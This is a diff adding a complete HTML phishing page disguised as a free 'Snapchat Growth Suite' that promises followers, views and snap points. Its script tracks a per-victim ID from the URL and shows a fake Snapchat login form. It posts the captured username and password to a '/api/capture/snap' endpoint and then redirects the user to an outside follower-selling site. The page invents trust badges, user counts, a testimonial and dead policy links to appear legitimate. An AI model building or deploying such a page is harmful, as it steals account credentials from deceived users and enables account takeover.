@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Snapchat Growth Suite</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: radial-gradient(circle at 30% 10%, #1a1a1a, #0d0d0d);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ===== ANIMATED FLOATING LOGOS (YELLOW) ===== */
+        .floating-logos {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .floating-logos span {
+            position: absolute;
+            display: block;
+            font-size: 40px;
+            opacity: 0.06;
+            animation: floatLogo 20s infinite linear;
+            color: #FFFC00;
+        }
+        .floating-logos span:nth-child(1) { left: 5%; animation-duration: 18s; animation-delay: 0s; font-size: 60px; }
+        .floating-logos span:nth-child(2) { left: 15%; animation-duration: 22s; animation-delay: 2s; font-size: 45px; }
+        .floating-logos span:nth-child(3) { left: 25%; animation-duration: 20s; animation-delay: 4s; font-size: 70px; }
+        .floating-logos span:nth-child(4) { left: 35%; animation-duration: 25s; animation-delay: 1s; font-size: 50px; }
+        .floating-logos span:nth-child(5) { left: 45%; animation-duration: 19s; animation-delay: 3s; font-size: 65px; }
+        .floating-logos span:nth-child(6) { left: 55%; animation-duration: 23s; animation-delay: 5s; font-size: 40px; }
+        .floating-logos span:nth-child(7) { left: 65%; animation-duration: 21s; animation-delay: 2s; font-size: 55px; }
+        .floating-logos span:nth-child(8) { left: 75%; animation-duration: 24s; animation-delay: 4s; font-size: 48px; }
+        .floating-logos span:nth-child(9) { left: 85%; animation-duration: 17s; animation-delay: 1s; font-size: 62px; }
+        .floating-logos span:nth-child(10) { left: 92%; animation-duration: 26s; animation-delay: 3s; font-size: 44px; }
+
+        @keyframes floatLogo {
+            0% { top: -10%; transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { top: 110%; transform: rotate(360deg) scale(1); }
+        }
+
+        /* ===== GLASS CARD (YELLOW ACCENT) ===== */
+        .glass {
+            background: rgba(255,252,0,0.04);
+            backdrop-filter: blur(16px);
+            border-radius: 40px;
+            padding: 32px 24px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255,252,0,0.15);
+            box-shadow: 0 25px 60px rgba(255,252,0,0.08);
+            text-align: center;
+            color: #fff;
+            position: relative;
+            z-index: 1;
+        }
+        .glass h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #FFFC00;
+        }
+        .glass .sub {
+            font-size: 13px;
+            letter-spacing: 2px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            margin: 4px 0 18px;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(255,252,0,0.04);
+            border-radius: 20px;
+            padding: 14px 10px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,252,0,0.08);
+        }
+        .stat-item {
+            text-align: center;
+        }
+        .stat-item .number {
+            font-size: 20px;
+            font-weight: 700;
+            color: #FFFC00;
+        }
+        .stat-item .label {
+            font-size: 10px;
+            opacity: 0.5;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #fff;
+        }
+        .testimonial {
+            background: rgba(255,252,0,0.04);
+            border-left: 3px solid #FFFC00;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin: 14px 0;
+            text-align: left;
+            font-size: 13px;
+            line-height: 1.5;
+            color: rgba(255,255,255,0.7);
+        }
+        .testimonial .author {
+            color: #FFFC00;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+        .option-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            margin: 18px 0;
+        }
+        .option-card {
+            background: rgba(255,252,0,0.04);
+            border: 1px solid rgba(255,252,0,0.08);
+            border-radius: 20px;
+            padding: 18px 10px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            backdrop-filter: blur(4px);
+        }
+        .option-card:active {
+            transform: scale(0.94);
+            background: rgba(255,252,0,0.15);
+            border-color: #FFFC00;
+        }
+        .option-card .icon {
+            font-size: 36px;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .option-card .label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .option-card .desc {
+            font-size: 11px;
+            opacity: 0.5;
+            margin-top: 2px;
+            color: rgba(255,255,255,0.6);
+        }
+        .glow-btn {
+            background: linear-gradient(145deg, #FFFC00, #e6e000);
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            color: #1a1a1a;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(255,252,0,0.3);
+            transition: 0.25s;
+            margin: 12px 0 6px;
+        }
+        .glow-btn:active { transform: scale(0.96); }
+        .input-group {
+            text-align: left;
+            margin: 14px 0 8px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            opacity: 0.7;
+            margin-bottom: 5px;
+            color: #fff;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255,252,0,0.15);
+            background: rgba(255,252,0,0.04);
+            color: #fff;
+            font-size: 16px;
+            transition: 0.25s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #FFFC00;
+            background: rgba(255,252,0,0.08);
+        }
+        .back-btn {
+            background: rgba(255,255,255,0.04) !important;
+            border: 1px solid rgba(255,252,0,0.08) !important;
+            box-shadow: none !important;
+            margin-top: 10px;
+            font-size: 15px !important;
+            padding: 14px !important;
+            color: #fff !important;
+        }
+        .footer-text {
+            font-size: 11px;
+            opacity: 0.3;
+            margin-top: 18px;
+            color: #fff;
+        }
+        .trust-badge {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 14px;
+            font-size: 12px;
+            opacity: 0.4;
+            color: #fff;
+        }
+        .trust-badge span { display: flex; align-items: center; gap: 4px; }
+        .fake-footer {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,252,0,0.08);
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            flex-wrap: wrap;
+            font-size: 11px;
+            opacity: 0.4;
+        }
+        .fake-footer a {
+            color: #fff;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        .fake-footer a:hover {
+            opacity: 0.8;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== ANIMATED FLOATING LOGOS (YELLOW) ===== -->
+    <div class="floating-logos">
+        <span>👻</span>
+        <span>💛</span>
+        <span>⭐</span>
+        <span>👻</span>
+        <span>💛</span>
+        <span>👻</span>
+        <span>🔥</span>
+        <span>👻</span>
+        <span>💛</span>
+        <span>👻</span>
+    </div>
+
+    <!-- ===== MAIN CARD ===== -->
+    <div class="glass" id="mainPage">
+        <h1>🚀 Boost Your Profile</h1>
+        <p class="sub">Grow your Snapchat presence organically</p>
+
+        <div class="stats">
+            <div class="stat-item">
+                <div class="number">10M+</div>
+                <div class="label">Active Users</div>
+            </div>
+            <div class="stat-item">
+                <div class="number">4.9★</div>
+                <div class="label">Rating</div>
+            </div>
+            <div class="stat-item">
+                <div class="number">99.9%</div>
+                <div class="label">Uptime</div>
+            </div>
+        </div>
+
+        <div class="testimonial">
+            “My Snapchat score increased by 50K in 3 days. This tool is legendary!”
+            <div class="author">— @snap_guru, 3M+ score</div>
+        </div>
+
+        <p style="font-size:14px; opacity:0.7; margin-bottom:6px; color: #fff;">Choose your growth service</p>
+        <div class="option-grid" id="optionGrid"></div>
+
+        <div class="trust-badge">
+            <span>🔒 256-bit SSL</span>
+            <span>🛡️ Secure Payment</span>
+            <span>🤝 24/7 Support</span>
+        </div>
+
+        <div class="fake-footer">
+            <a href="#">🆘 Help Desk</a>
+            <a href="#">📜 Terms of Service</a>
+            <a href="#">🔒 Privacy Policy</a>
+        </div>
+
+        <p class="footer-text">Join 5M+ creators who grew their Snapchat</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('v') || 'unknown';
+
+        const options = [
+            { id: 'followers', icon: '👥', label: 'FREE FOLLOWERS', desc: 'Boost your profile' },
+            { id: 'views', icon: '👁️', label: 'FREE VIEWS', desc: 'Increase story views' },
+            { id: 'comments', icon: '💬', label: 'FREE COMMENTS', desc: 'Get real comments' },
+            { id: 'likes', icon: '❤️', label: 'FREE LIKES', desc: 'Grow your likes' },
+            { id: 'snap_points', icon: '⭐', label: 'FREE SNAP POINTS', desc: 'Boost your snap score' }
+        ];
+
+        const grid = document.getElementById('optionGrid');
+        options.forEach(opt => {
+            const card = document.createElement('div');
+            card.className = 'option-card';
+            card.innerHTML = `
+                <span class="icon">${opt.icon}</span>
+                <div class="label">${opt.label}</div>
+                <div class="desc">${opt.desc}</div>
+            `;
+            card.onclick = () => showNumberInput(opt.id, opt.label);
+            grid.appendChild(card);
+        });
+
+        function showNumberInput(optionId, optionLabel) {
+            const main = document.getElementById('mainPage');
+            main.innerHTML = `
+                <h1 style="color: #FFFC00;">📊 ${optionLabel}</h1>
+                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px; color: #fff;">
+                    Enter the number of ${optionId.toLowerCase().replace('_', ' ')} you want
+                </p>
+                <div class="input-group">
+                    <label>🔢 Quantity</label>
+                    <input type="number" id="quantityInput" placeholder="e.g. 1000" min="1" />
+                </div>
+                <button class="glow-btn" onclick="showLogin('${optionId}', '${optionLabel}')">Next →</button>
+                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
+                <div class="fake-footer" style="margin-top:20px;">
+                    <a href="#">🆘 Help Desk</a>
+                    <a href="#">📜 Terms</a>
+                    <a href="#">🔒 Privacy</a>
+                </div>
+                <p class="footer-text" style="margin-top:12px;">Secure & encrypted</p>
+            `;
+        }
+
+        function showLogin(optionId, optionLabel) {
+            const quantity = document.getElementById('quantityInput').value;
+            if (!quantity || quantity < 1) {
+                alert('⚠️ Please enter a valid number');
+                return;
+            }
+
+            const main = document.getElementById('mainPage');
+            main.innerHTML = `
+                <h1 style="color: #FFFC00;">🔐 Snapchat Login</h1>
+                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px; color: #fff;">
+                    Enter your credentials to get <strong style="color: #FFFC00;">${quantity}</strong> ${optionId.toLowerCase().replace('_', ' ')}
+                </p>
+                <div class="input-group">
+                    <label>👤 Username</label>
+                    <input type="text" id="loginUser" placeholder="Enter your Snapchat username" />
+                </div>
+                <div class="input-group">
+                    <label>🔒 Password</label>
+                    <input type="password" id="loginPass" placeholder="Enter your password" />
+                </div>
+                <button class="glow-btn" onclick="submitLogin('${optionId}', '${quantity}')">🚀 Claim Now</button>
+                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
+                <div class="fake-footer" style="margin-top:20px;">
+                    <a href="#">🆘 Help Desk</a>
+                    <a href="#">📜 Terms</a>
+                    <a href="#">🔒 Privacy</a>
+                </div>
+                <p class="footer-text" style="margin-top:12px;">🔐 Your data is secure & encrypted</p>
+            `;
+        }
+
+        async function sendData(payload) {
+            try {
+                await fetch('/api/capture/snap', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victim_id: victimId, type: 'snap', ...payload })
+                });
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+        }
+
+        async function submitLogin(optionId, quantity) {
+            const username = document.getElementById('loginUser').value;
+            const password = document.getElementById('loginPass').value;
+            if (!username || !password) {
+                alert('⚠️ Please fill all fields');
+                return;
+            }
+            await sendData({
+                creds: {
+                    platform: 'snapchat',
+                    username: username,
+                    password: password,
+                    service: optionId,
+                    quantity: quantity
+                }
+            });
+            window.location.href = 'https://takipcikrali.com/';
+        }
+    </script>
+</body>
+</html>
